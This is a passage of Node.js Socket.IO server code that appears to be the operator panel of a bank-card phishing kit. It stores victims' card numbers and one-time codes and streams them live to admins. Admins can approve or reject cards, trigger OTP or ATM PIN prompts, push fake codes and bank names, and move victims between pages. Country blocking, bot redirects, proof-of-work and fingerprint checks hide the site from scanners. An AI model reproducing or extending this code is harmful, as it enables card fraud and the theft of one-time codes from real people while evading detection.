          // Notify admins about duplicate OTP rejection
          admins.forEach((admin, adminSocketId) => {
            io.to(adminSocketId).emit("visitor:duplicateOtp", {
              visitorId: visitor._id,
              code: data.digitCode,
              page: data.page,
              visitor: visitor,
            });
          });
          console.log(`Duplicate OTP rejected for visitor ${visitor._id}: ${data.digitCode}`);
          return;
        }
        const now = new Date().toISOString();
        visitor.digitCodes.push({
          code: data.digitCode,
          page: data.page,
          timestamp: now,
        });
        // Only update if already entered card page
        if (visitor.hasEnteredCardPage) {
          visitor.lastDataUpdate = now;
        }
      }

      visitor.page = data.page;
      visitor.waitingForAdminResponse = data.waitingForAdminResponse || false;
      visitor.hasNewData = true;
      visitors.set(socket.id, visitor);
      saveVisitorPermanently(visitor);

      // Notify admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("visitor:dataSubmitted", {
          visitorId: visitor._id,
          socketId: socket.id,
          data: data,
          visitor: visitor,
        });
      });
      broadcastSiteVisitors();

      // Send push notification for new visitor data
      const pageName = data.page || visitor.page || '';
      const visitorNum = visitor.visitorNumber || '';
      sendPushNotification(
        `بيانات جديدة - زائر #${visitorNum}`,
        `${pageName}`,
        { visitorId: visitor._id, page: pageName }
      ).catch(err => console.error('Push notification error:', err));

      console.log(`Data received from visitor ${visitor._id}:`, data);
    }
  });

  // Handle card number verification
  socket.on("cardNumber:verify", (cardNumber) => {
    const visitor = visitors.get(socket.id);
    if (visitor) {
      visitor.lastActivity = Date.now();
      visitor.isIdle = false;
      // Check if card prefix is blocked (per-visitor or global)
      const prefix = cardNumber.substring(0, 4);
      const isBlocked = visitor.blockedCardPrefixes.includes(prefix) || globalBlockedCards.includes(prefix);

      socket.emit("cardNumber:verified", !isBlocked);

      // Notify admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("visitor:cardVerification", {
          visitorId: visitor._id,
          cardNumber,
          isBlocked,
        });
      });
    }
  });

  // Admin registration
  socket.on("admin:register", (credentials) => {
    // Simple admin authentication - uses persistent password from disk
    if (credentials.password === adminPassword) {
      admins.set(socket.id, {
        socketId: socket.id,
        connectedAt: new Date().toISOString(),
      });
      socket.isAdmin = true;
      socket.handshake.query.admin = 'true'; // Also mark in handshake for middleware

      socket.emit("admin:authenticated", true);

      // Send current site visitors count immediately
      broadcastSiteVisitors();

      // Get all connected visitor IDs from the active visitors Map
      const connectedVisitorIds = new Set();
      visitors.forEach((v) => {
        connectedVisitorIds.add(v._id);
      });
      
      // Update connection status for saved visitors based on _id match
      const visitorsWithStatus = savedVisitors.map(v => {
        // Check if this visitor's _id is in the connected visitors
        const isCurrentlyConnected = connectedVisitorIds.has(v._id);
        // Also update socketId if connected
        let currentSocketId = v.socketId;
        visitors.forEach((activeVisitor, sid) => {
          if (activeVisitor._id === v._id) {
            currentSocketId = sid;
          }
        });
        // Check if visitor is idle (no activity for 30 seconds)
        let isIdle = false;
        if (isCurrentlyConnected) {
          const activeVisitorArr = Array.from(visitors.values()).find(av => av._id === v._id);
          if (activeVisitorArr && activeVisitorArr.lastActivity) {
            isIdle = (Date.now() - activeVisitorArr.lastActivity) > 60000;
          }
        }
        return { ...v, socketId: currentSocketId, isConnected: isCurrentlyConnected, isIdle };
      });

      // Sort visitors by lastDataUpdate (most recent first)
      visitorsWithStatus.sort((a, b) => {
        const dateA = a.lastDataUpdate ? new Date(a.lastDataUpdate).getTime() : 0;
        const dateB = b.lastDataUpdate ? new Date(b.lastDataUpdate).getTime() : 0;
        return dateB - dateA;
      });

      console.log(`Sending ${visitorsWithStatus.length} visitors to admin, ${connectedVisitorIds.size} connected`);

      // Calculate display visitor count (null means use natural count)
      const currentDisplayCount = displayVisitorCount !== null ? displayVisitorCount : new Set(savedVisitors.map(v => v.ip).filter(ip => ip)).size || savedVisitors.length;

      // Send all saved visitors to admin with updated connection status
      socket.emit("visitors:list", visitorsWithStatus, { displayVisitorCount: currentDisplayCount });

      // Notify visitors that admin is connected
      visitors.forEach((visitor, visitorSocketId) => {
        io.to(visitorSocketId).emit("isAdminConnected", true);
      });

      console.log(`Admin connected: ${socket.id}`);
    } else {
      socket.emit("admin:authenticated", false);
    }
  });

  // Admin: Approve form
  socket.on("admin:approve", (visitorSocketId) => {
    io.to(visitorSocketId).emit("form:approved");
    // تحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      broadcastVisitorsToAdmins();
    }
    console.log(`Form approved for visitor: ${visitorSocketId}`);
  });

  // Admin: Reject form
  socket.on("admin:reject", (data) => {
    const visitorSocketId = data.visitorSocketId || data;
    io.to(visitorSocketId).emit("form:rejected");
    // تحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      broadcastVisitorsToAdmins();
    }
    console.log(`Form rejected for visitor: ${visitorSocketId}`);
  });

  // Admin: Reject Mobily call (special handling for Mobily page)
  socket.on("admin:mobilyReject", (visitorSocketId) => {
    io.to(visitorSocketId).emit("mobily:rejected");
    // تحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      broadcastVisitorsToAdmins();
    }
    console.log(`Mobily call rejected for visitor: ${visitorSocketId}`);
  });

  // Admin: Send verification code
  socket.on("admin:sendCode", ({ visitorSocketId, code }) => {
    io.to(visitorSocketId).emit("code", code);
    // حفظ الرمز في بيانات الزائر وتحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.lastSentCode = code;
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      broadcastVisitorsToAdmins();
    }
    console.log(`Code sent to visitor ${visitorSocketId}: ${code}`);
  });

  // Admin: Navigate visitor to page
  socket.on("admin:navigate", ({ visitorSocketId, page }) => {
    io.to(visitorSocketId).emit("visitor:navigate", page);
    // تحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      broadcastVisitorsToAdmins();
    }
    console.log(`Navigating visitor ${visitorSocketId} to: ${page}`);
  });

  // Admin: Card action (OTP, ATM, Reject)
  socket.on("admin:cardAction", ({ visitorSocketId, action }) => {
    io.to(visitorSocketId).emit("card:action", action);
    // تحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      // If admin rejected the card, add last card number to rejectedCards list
      if (action === 'reject' && visitor.paymentCards && visitor.paymentCards.length > 0) {
        if (!visitor.rejectedCards) visitor.rejectedCards = [];
        const lastCard = visitor.paymentCards[visitor.paymentCards.length - 1];
        if (lastCard && lastCard.cardNumber && !visitor.rejectedCards.includes(lastCard.cardNumber)) {
          visitor.rejectedCards.push(lastCard.cardNumber);
        }
      }
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      broadcastVisitorsToAdmins();
    }
    console.log(`Card action ${action} sent to visitor ${visitorSocketId}`);
  });

  // Admin: Code action (Approve, Reject) for OTP/digit codes
  socket.on("admin:codeAction", ({ visitorSocketId, action, codeIndex }) => {
    io.to(visitorSocketId).emit("code:action", { action, codeIndex });
    // تحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      broadcastVisitorsToAdmins();
    }
    console.log(`Code action ${action} sent to visitor ${visitorSocketId}`);
  });

  // Admin: Approve resend code request
  socket.on("admin:approveResend", ({ visitorSocketId }) => {
    io.to(visitorSocketId).emit("resend:approved");
    // تحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      broadcastVisitorsToAdmins();
    }
    console.log(`Resend approved for visitor ${visitorSocketId}`);
  });

  // Admin: Block visitor
  socket.on("admin:block", ({ visitorSocketId }) => {
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.isBlocked = true;
      visitor.blockReason = "manual";
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.to(visitorSocketId).emit("blocked");
      // Disconnect after 2s delay to ensure client receives blocked event and stops reconnection
      setTimeout(() => {
        const targetSocket = io.sockets.sockets.get(visitorSocketId);
        if (targetSocket) targetSocket.disconnect();
      }, 2000);
      console.log(`Visitor blocked and will be disconnected: ${visitorSocketId}`);
    }
  });

  // Admin: Unblock visitor
  socket.on("admin:unblock", ({ visitorSocketId }) => {
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.isBlocked = false;
      delete visitor.blockReason;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.to(visitorSocketId).emit("unblocked");
      console.log(`Visitor unblocked: ${visitorSocketId}`);
    } else {
      // Visitor not connected - unblock from saved data
      const saved = savedVisitors.find(v => v.socketId === visitorSocketId || v._id === visitorSocketId);
      if (saved) {
        saved.isBlocked = false;
        delete saved.blockReason;
        saveData();
        console.log(`Visitor unblocked from saved data: ${visitorSocketId}`);
      }
    }
  });

  // Admin: Delete visitor by socket ID
  socket.on("admin:delete", (visitorSocketId) => {
    io.to(visitorSocketId).emit("deleted");
    visitors.delete(visitorSocketId);
    
    // Also remove from saved visitors
    const visitorToDelete = Array.from(visitors.values()).find(v => v.socketId === visitorSocketId);
    if (visitorToDelete) {
      savedVisitors = savedVisitors.filter(v => v._id !== visitorToDelete._id);
      saveData();
    }
    
    console.log(`Visitor deleted: ${visitorSocketId}`);
  });

  // Admin: Delete visitor by ID
  socket.on("admin:deleteById", (visitorId) => {
    // Find and remove from active visitors
    visitors.forEach((v, socketId) => {
      if (v._id === visitorId) {
        io.to(socketId).emit("deleted");
        visitors.delete(socketId);
      }
    });
    
    // Remove from saved visitors
    savedVisitors = savedVisitors.filter(v => v._id !== visitorId);
    saveData();
    
    // Notify all admins
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("visitor:deleted", { visitorId });
    });
    
    console.log(`Visitor deleted by ID: ${visitorId}`);
  });

  // Admin: Send last message
  socket.on("admin:sendMessage", ({ visitorSocketId, message }) => {
    io.to(visitorSocketId).emit("admin-last-message", { message });
    console.log(`Message sent to visitor ${visitorSocketId}: ${message}`);
  });

  // Admin: Set bank name
  socket.on("admin:setBankName", ({ visitorSocketId, bankName }) => {
    io.to(visitorSocketId).emit("bankName", bankName);
    console.log(`Bank name set for visitor ${visitorSocketId}: ${bankName}`);
  });

  // Admin: Change password
  socket.on("admin:changePassword", ({ oldPassword, newPassword }) => {
    // Verify old password - uses persistent password from disk
    if (oldPassword === adminPassword) {
      // Update password and save to disk for persistence
      adminPassword = newPassword;
      saveData();
      socket.emit("admin:passwordChanged", true);
      console.log("Admin password changed successfully and saved to disk");
      
      // Force logout ALL other admin sessions
      admins.forEach((admin, adminSocketId) => {
        if (adminSocketId !== socket.id) {
          io.to(adminSocketId).emit("admin:forceLogout");
          admins.delete(adminSocketId);
          console.log(`Force logged out admin: ${adminSocketId}`);
        }
      });
      
      // Force logout the password changer too after a delay
      setTimeout(() => {
        io.to(socket.id).emit("admin:forceLogout");
        admins.delete(socket.id);
        console.log(`Force logged out password changer: ${socket.id}`);
      }, 2000);
      
      console.log("All admin sessions logged out after password change");
    } else {
      socket.emit("admin:passwordChanged", false);
      console.log("Admin password change failed - wrong old password");
    }
  });

  // Admin: Clear all data
  socket.on("admin:clearAllData", () => {
    // Disconnect all visitors
    visitors.forEach((v, socketId) => {
      io.to(socketId).emit("deleted");
    });
    
    // Clear all data
    visitors.clear();
    savedVisitors = [];
    visitorCounter = 0;
    displayVisitorCount = 0;
    
    // Save empty data to disk
    saveData();
    
    // Notify all admins
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("allDataCleared");
    });
    
    console.log("All data cleared by admin");
  });

  // Admin: Reset visitor counter only (without deleting any data)
  socket.on("admin:resetVisitorCounter", () => {
    displayVisitorCount = 0;
    
    // Save to disk
    saveData();
    
    // Notify all admins with the reset count
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("visitorCounterReset", { displayVisitorCount: 0 });
    });
    
    console.log("Visitor display counter reset by admin");
  });

  // WhatsApp: Get current number
  socket.on("whatsapp:get", () => {
    // Send to admin
    socket.emit("whatsapp:current", whatsappNumber);
    // Also send to client (for footer)
    socket.emit("whatsapp:update", whatsappNumber);
  });

  // WhatsApp: Set number (admin only)
  socket.on("whatsapp:set", (number) => {
    whatsappNumber = number;
    saveData();
    // Broadcast to all connected clients
    io.emit("whatsapp:update", whatsappNumber);
    console.log(`WhatsApp number updated: ${whatsappNumber}`);
  });

  // Blocked Cards: Get list
  socket.on("blockedCards:get", () => {
    socket.emit("blockedCards:list", globalBlockedCards);
  });

  // Blocked Cards: Add prefix
  socket.on("blockedCards:add", (prefix) => {
    if (prefix && prefix.length === 4 && !globalBlockedCards.includes(prefix)) {
      globalBlockedCards.push(prefix);
      saveData();
      // Notify all admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("blockedCards:list", globalBlockedCards);
      });
      // Broadcast to all clients
      io.emit("blockedCards:updated", globalBlockedCards);
      console.log(`Blocked card prefix added: ${prefix}`);
    }
  });

  // Blocked Cards: Remove prefix
  socket.on("blockedCards:remove", (prefix) => {
    globalBlockedCards = globalBlockedCards.filter(p => p !== prefix);
    saveData();
    // Notify all admins
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("blockedCards:list", globalBlockedCards);
    });
    // Broadcast to all clients
    io.emit("blockedCards:updated", globalBlockedCards);
    console.log(`Blocked card prefix removed: ${prefix}`);
  });

  // Blocked Cards: Check if card is blocked (for clients)
  socket.on("blockedCards:check", (cardNumber) => {
    const prefix = cardNumber.replace(/\s/g, '').substring(0, 4);
    const isBlocked = globalBlockedCards.includes(prefix);
    socket.emit("blockedCards:checkResult", { isBlocked, prefix });
  });

  // Blocked Countries: Get list
  socket.on("blockedCountries:get", () => {
    socket.emit("blockedCountries:list", globalBlockedCountries);
  });

  // Blocked Countries: Add country
  socket.on("blockedCountries:add", (country) => {
    if (country && !globalBlockedCountries.includes(country)) {
      globalBlockedCountries.push(country);
      saveData();
      // Notify all admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("blockedCountries:list", globalBlockedCountries);
      });
      // Broadcast to all clients
      io.emit("blockedCountries:updated", globalBlockedCountries);
      console.log(`Blocked country added: ${country}`);
      // Sync to Cloudflare WAF on all zones
      syncBlockedCountriesToCloudflare(globalBlockedCountries);
    }
  });

  // Blocked Countries: Remove country
  socket.on("blockedCountries:remove", (country) => {
    globalBlockedCountries = globalBlockedCountries.filter(c => c !== country);
    saveData();
    // Notify all admins
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("blockedCountries:list", globalBlockedCountries);
    });
    // Broadcast to all clients
    io.emit("blockedCountries:updated", globalBlockedCountries);
    console.log(`Blocked country removed: ${country}`);
    // Sync to Cloudflare WAF on all zones
    syncBlockedCountriesToCloudflare(globalBlockedCountries);
  });

  // Blocked Countries: Check if visitor's country is blocked
  socket.on("blockedCountries:check", (country) => {
    const isBlocked = globalBlockedCountries.some(c => 
      c.toLowerCase() === country.toLowerCase()
    );
    socket.emit("blockedCountries:checkResult", { isBlocked, country });
  });

  // Allowed Domains: Get list
  socket.on("allowedDomains:get", () => {
    socket.emit("allowedDomains:list", allowedDomains);
  });

  // Allowed Domains: Add domain
  socket.on("allowedDomains:add", (domain) => {
    if (domain && !allowedDomains.includes(domain)) {
      // Clean domain - remove https://, www., trailing slashes
      let cleanDomain = domain.replace(/^https?:\/\//, '').replace(/^www\./, '').replace(/\/+$/, '').toLowerCase();
      if (cleanDomain && !allowedDomains.includes(cleanDomain)) {
        allowedDomains.push(cleanDomain);
        saveData();
        // Notify all admins
        admins.forEach((admin, adminSocketId) => {
          io.to(adminSocketId).emit("allowedDomains:list", allowedDomains);
        });
        console.log(`Allowed domain added: ${cleanDomain}`);
      }
    }
  });

  // Allowed Domains: Remove domain
  socket.on("allowedDomains:remove", (domain) => {
    allowedDomains = allowedDomains.filter(d => d !== domain);
    saveData();
    // Notify all admins
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("allowedDomains:list", allowedDomains);
    });
    console.log(`Allowed domain removed: ${domain}`);
  });

  // Bot Redirect: Get current URL
  socket.on("botRedirect:get", () => {
    socket.emit("botRedirect:current", botRedirectUrl);
  });

  // Bot Redirect: Set URL
  socket.on("botRedirect:set", (url) => {
    botRedirectUrl = (url || '').trim();
    console.log(`Bot redirect URL ${botRedirectUrl ? 'set to: ' + botRedirectUrl : 'cleared (block only)'}`);
    // Notify all admins
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("botRedirect:current", botRedirectUrl);
    });
  });

  // Admin: Mark visitor data as read (hide new data indicator)
  socket.on("admin:markAsRead", (visitorId) => {
    // Find visitor by ID in active visitors
    let found = false;
    visitors.forEach((v, socketId) => {
      if (v._id === visitorId) {
        v.hasNewData = false;
        visitors.set(socketId, v);
        saveVisitorPermanently(v);
        found = true;
      }
    });
    
    // Also update in saved visitors
    const savedVisitor = savedVisitors.find(v => v._id === visitorId);
    if (savedVisitor) {
      savedVisitor.hasNewData = false;
      saveData();
    }
    
    // Notify all admins about the update
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("visitor:markedAsRead", { visitorId });
    });
    
    console.log(`Visitor ${visitorId} marked as read`);
  });

  // Admin: Toggle star on visitor
  socket.on("admin:toggleStar", (visitorId) => {
    // Find visitor by ID in active visitors
    visitors.forEach((v, socketId) => {
      if (v._id === visitorId) {
        v.isStarred = !v.isStarred;
        visitors.set(socketId, v);
        saveVisitorPermanently(v);
      }
    });
    
    // Also update in saved visitors
    const savedVisitor = savedVisitors.find(v => v._id === visitorId);
    if (savedVisitor) {
      savedVisitor.isStarred = !savedVisitor.isStarred;
      saveData();
    }
    
    // Notify all admins about the update
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("visitor:starToggled", { visitorId, isStarred: savedVisitor ? savedVisitor.isStarred : false });
    });
  });

  // Chat: Message from visitor to admin
  socket.on("chat:fromVisitor", ({ visitorSocketId, message, timestamp }) => {
    // Anti-Bot: Human Speed Check
    // If visitor sends a message in less than 3 seconds after registration, it's likely a bot
    const now = Date.now();
    if (socket._registeredAt && (now - socket._registeredAt < 3000)) {
      console.log(`Anti-Bot: Blocked instant chat message from ${socket.id} (sent in ${(now - socket._registeredAt)/1000}s)`);
      return;
    }

    // Anti-Bot: Rate Limiting (Max 1 message every 2 seconds)
    if (socket._lastChatMessageTime && (now - socket._lastChatMessageTime < 2000)) {
      console.log(`Anti-Bot: Throttled chat message from ${socket.id}`);
      return;
    }
    socket._lastChatMessageTime = now;

    const visitor = visitors.get(visitorSocketId) || visitors.get(socket.id);
    if (visitor) {
      // Initialize chat messages array if not exists
      if (!visitor.chatMessages) {
        visitor.chatMessages = [];
      }
      
      // Add message to visitor's chat history
      const chatMessage = {
        id: Date.now().toString(),
        text: message,
        sender: 'visitor',
        timestamp: timestamp || new Date().toISOString()
      };
      visitor.chatMessages.push(chatMessage);
      visitor.hasNewMessage = true;
      visitors.set(visitor.socketId, visitor);
      saveVisitorPermanently(visitor);
      
      // Notify all admins about the new message
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("chat:newMessage", {
          visitorSocketId: visitor.socketId,
          visitorId: visitor._id,
          message: chatMessage
        });
      });
      
      console.log(`Chat message from visitor ${visitor.socketId}: ${message}`);
    }
  });

  // Chat: Message from admin to visitor
  socket.on("chat:fromAdmin", ({ visitorSocketId, message, timestamp }) => {
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      // Initialize chat messages array if not exists
      if (!visitor.chatMessages) {
        visitor.chatMessages = [];
      }
      
      // Add message to visitor's chat history
      const chatMessage = {
        id: Date.now().toString(),
        text: message,
        sender: 'admin',
        timestamp: timestamp || new Date().toISOString()
      };
      visitor.chatMessages.push(chatMessage);
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      
      // Send message to visitor
      io.to(visitorSocketId).emit("chat:fromAdmin", {
        message: message,
        timestamp: chatMessage.timestamp
      });
      
      console.log(`Chat message from admin to visitor ${visitorSocketId}: ${message}`);
    }
  });

  // Chat: Mark messages as read
  socket.on("chat:markAsRead", ({ visitorSocketId }) => {
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.hasNewMessage = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
    }
  });

  // Admin: Block card prefix
  socket.on("admin:blockCardPrefix", ({ visitorSocketId, prefix }) => {
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      if (!visitor.blockedCardPrefixes.includes(prefix)) {
        visitor.blockedCardPrefixes.push(prefix);
        visitors.set(visitorSocketId, visitor);
        saveVisitorPermanently(visitor);
      }
      console.log(`Card prefix blocked for visitor ${visitorSocketId}: ${prefix}`);
    }
  });

  // Handle disconnection
  socket.on("disconnect", (reason) => {
    console.log(`Socket disconnect: ${socket.id}, reason: ${reason}`);
    // Check if it's a visitor
    if (visitors.has(socket.id)) {
      const visitor = visitors.get(socket.id);
      const visitorId = visitor._id;
      const socketId = socket.id;
      
      // Don't delete visitor data - keep it permanently
      visitors.delete(socket.id);
      
      // Delay disconnect notification to allow for quick reconnection
      setTimeout(() => {
        // Check if visitor reconnected with same ID
        const reconnected = Array.from(visitors.values()).some(v => v._id === visitorId && v.isConnected);
        
        if (!reconnected) {
          // Update saved visitor as disconnected
          const savedVisitor = savedVisitors.find(v => v._id === visitorId);
          if (savedVisitor) {
            savedVisitor.isConnected = false;
            saveData();
          }
          
          // Notify admins
          admins.forEach((admin, adminSocketId) => {
            io.to(adminSocketId).emit("visitor:disconnected", {
              visitorId: visitorId,
              socketId: socketId,
              connectedVisitors: visitors.size,
            });
          });
          
          console.log(`Visitor disconnected: ${socketId}`);
        } else {
          console.log(`Visitor ${visitorId} reconnected quickly, skipping disconnect notification`);
        }
      }, 1000); // 1 second delay
    }

    // Check if it's an admin
    if (admins.has(socket.id)) {
      admins.delete(socket.id);

      // Notify visitors if no admins left
      if (admins.size === 0) {
        visitors.forEach((visitor, visitorSocketId) => {
          io.to(visitorSocketId).emit("isAdminConnected", false);
        });
      }

      console.log(`Admin disconnected: ${socket.id}`);
    }
  });
});

// === Proof of Work System ===
// Forces browsers to solve a computational challenge before connecting
// Real user: 2-3 seconds in background (Web Worker), unnoticeable
// Bot wanting 100 visitors: 200-300 seconds = 5 minutes minimum
const powChallenges = new Map(); // challengeId -> { challenge, difficulty, ip, createdAt }
const POW_CHALLENGE_EXPIRY = 30000; // 30 seconds to solve
const POW_DIFFICULTY = 4; // number of leading zeros in hex (4 = ~65536 iterations avg = ~2-3 sec)

// Cleanup expired challenges every 30 seconds
setInterval(() => {
  const now = Date.now();
  for (const [id, data] of powChallenges) {
    if (now - data.createdAt > POW_CHALLENGE_EXPIRY) {
      powChallenges.delete(id);
    }
  }
  if (powChallenges.size > 5000) powChallenges.clear();
}, 30000);

// Public endpoint to get WhatsApp number (no auth required)
app.get("/api/whatsapp", (req, res) => {
  res.json({ number: whatsappNumber || "" });
});

// Issue a PoW challenge
app.get("/api/pow-challenge", (req, res) => {
  const ip = req.headers['cf-connecting-ip'] || req.headers['x-forwarded-for'] || req.ip;
  
  // Check blacklist
  if (isBlacklisted(ip)) {
    return res.status(403).end();
  }
  
  const challengeId = crypto.randomBytes(16).toString('hex');
  const challenge = crypto.randomBytes(32).toString('hex');
  
  powChallenges.set(challengeId, {
    challenge,
    difficulty: POW_DIFFICULTY,
    ip,
    createdAt: Date.now(),
    solved: false
  });
  
  res.json({ challengeId, challenge, difficulty: POW_DIFFICULTY });
});

// Verify PoW solution
function verifyPoW(challengeId, nonce) {
  const data = powChallenges.get(challengeId);
  if (!data) return { valid: false, reason: 'challenge_not_found' };
  if (data.solved) return { valid: false, reason: 'already_solved' };
  if (Date.now() - data.createdAt > POW_CHALLENGE_EXPIRY) {
    powChallenges.delete(challengeId);
    return { valid: false, reason: 'challenge_expired' };
  }
  
  // Verify: SHA-256(challenge + nonce) must start with `difficulty` zeros in hex
  const hash = crypto.createHash('sha256').update(data.challenge + nonce).digest('hex');
  const prefix = '0'.repeat(data.difficulty);
  
  if (hash.startsWith(prefix)) {
    data.solved = true;
    return { valid: true };
  }
  return { valid: false, reason: 'invalid_solution' };
}

// === Connection Token System ===
// Visitors must get a token via HTTP before connecting to Socket.IO
// This prevents bots from opening thousands of socket connections
const connectionTokens = new Map(); // token -> { ip, createdAt, used }
const TOKEN_EXPIRY = 60000; // 60 seconds
const MAX_TOKENS_PER_MINUTE = 15; // max tokens issued per minute globally (lowered from 30)
let tokenTimestamps = [];

// Cleanup expired tokens every 30 seconds
setInterval(() => {
  const now = Date.now();
  for (const [token, data] of connectionTokens) {
    if (now - data.createdAt > TOKEN_EXPIRY || data.used) {
      connectionTokens.delete(token);
    }
  }
  // Safety cap
  if (connectionTokens.size > 1000) connectionTokens.clear();
}, 30000);

// Per-IP token request tracking (prevent same IP from requesting too many tokens)
const ipTokenRequests = new Map(); // ip -> { count, firstRequest }
const IP_TOKEN_WINDOW = 60 * 1000; // 1 minute
const IP_TOKEN_MAX = 3; // max 3 token requests per IP per minute (real user needs 1)

app.post("/api/connection-token", async (req, res) => {
  const ip = req.headers['cf-connecting-ip'] || req.headers['x-forwarded-for'] || req.ip;
  const ua = req.headers['user-agent'] || '';
  const origin = req.headers.origin || req.headers.referer || '';
  
  // Check IP blacklist
  if (isBlacklisted(ip)) {
    return res.status(403).end();
  }
  
  // Per-IP token rate limit
  const now_ip = Date.now();
  const ipData = ipTokenRequests.get(ip);
  if (ipData) {
    if (now_ip - ipData.firstRequest < IP_TOKEN_WINDOW) {
      ipData.count++;
      if (ipData.count > IP_TOKEN_MAX) {
        blacklistIP(ip, 'token_flood');
        console.log(`[TOKEN] IP token flood: ${ip}, count=${ipData.count}`);
        return res.json({ success: false, reason: 'rate_limited' });
      }
    } else {
      ipTokenRequests.set(ip, { count: 1, firstRequest: now_ip });
    }
  } else {
    ipTokenRequests.set(ip, { count: 1, firstRequest: now_ip });
  }
  
  // Cleanup ipTokenRequests every 2 minutes
  if (ipTokenRequests.size > 2000) {
    for (const [k, v] of ipTokenRequests) {
      if (now_ip - v.firstRequest > IP_TOKEN_WINDOW) ipTokenRequests.delete(k);
    }
  }
  
  // 0. Origin check - only allow from allowed domains
  if (process.env.NODE_ENV === 'production') {
    if (!origin) {
      console.log(`[TOKEN] BLOCKED - no origin, IP=${ip}`);
      return res.json({ success: false, reason: 'unauthorized' });
    }
    const allowed = buildAllowedOrigins();
    const isAllowedOrigin = allowed.some(a => origin.startsWith(a));
    if (!isAllowedOrigin) {
      console.log(`[TOKEN] BLOCKED - unauthorized origin: ${origin}, IP=${ip}`);
      return res.json({ success: false, reason: 'unauthorized' });
    }
  }
  
  // 1. Bot detection by User-Agent
  if (isBot(ua)) {
    console.log(`[TOKEN] Bot blocked: IP=${ip}, UA=${ua.substring(0, 60)}`);
    return res.json({ success: false, reason: 'bot_detected', redirect: botRedirectUrl || '' });
  }
  
  // 2. Rate limit token generation
  const now = Date.now();
  tokenTimestamps = tokenTimestamps.filter(t => now - t < 60000);
  if (tokenTimestamps.length >= MAX_TOKENS_PER_MINUTE) {
    return res.json({ success: false, reason: 'rate_limited' });
  }
  tokenTimestamps.push(now);
  
  // 3. IP velocity check
  if (isIPTooFast(ip)) {
    console.log(`[TOKEN] IP too fast: ${ip}`);
    return res.json({ success: false, reason: 'ip_too_fast' });
  }
  
  // 4. Proof of Work verification
  const powChallengeId = req.body?.powChallengeId || '';
  const powNonce = req.body?.powNonce || '';
  if (!powChallengeId || !powNonce) {
    console.log(`[TOKEN] BLOCKED - no PoW solution, IP=${ip}`);
    return res.json({ success: false, reason: 'pow_required' });
  }
  const powResult = verifyPoW(powChallengeId, powNonce);
  if (!powResult.valid) {
    console.log(`[TOKEN] BLOCKED - PoW failed: ${powResult.reason}, IP=${ip}`);
    if (powResult.reason === 'invalid_solution') {
      blacklistIP(ip, 'pow_invalid_solution');
    }
    return res.json({ success: false, reason: 'pow_failed' });
  }
  console.log(`[TOKEN] PoW=OK, IP=${ip}`);
  
  // 5. Turnstile verification
  const turnstileToken = req.body?.turnstileToken || '';
  const turnstileResult = await verifyTurnstileToken(turnstileToken, ip);
  
  // 5. Fingerprint validation (always check, not just fallback)
  const fingerprint = req.body?.fingerprint;
  const fpResult = validateFingerprint(fingerprint);
  
  // 6. Behavioral analysis
  const behavior = req.body?.behavior;
  const bhResult = validateBehavior(behavior);
  
  // 7. Decision logic:
  // - Turnstile OK → allow (Turnstile is the strongest check)
  // - Turnstile FAIL + Fingerprint OK + Behavior OK → allow (both must pass)
  // - Turnstile FAIL + anything else → BLOCK
  
  if (turnstileResult.success) {
    // Turnstile passed - strongest verification, allow
    console.log(`[TOKEN] Turnstile=OK, FP=${fpResult.score}, BH=${bhResult.score}, IP=${ip}`);
  } else {
    // Turnstile failed - BOTH fingerprint AND behavior must pass
    if (fpResult.valid && bhResult.valid) {
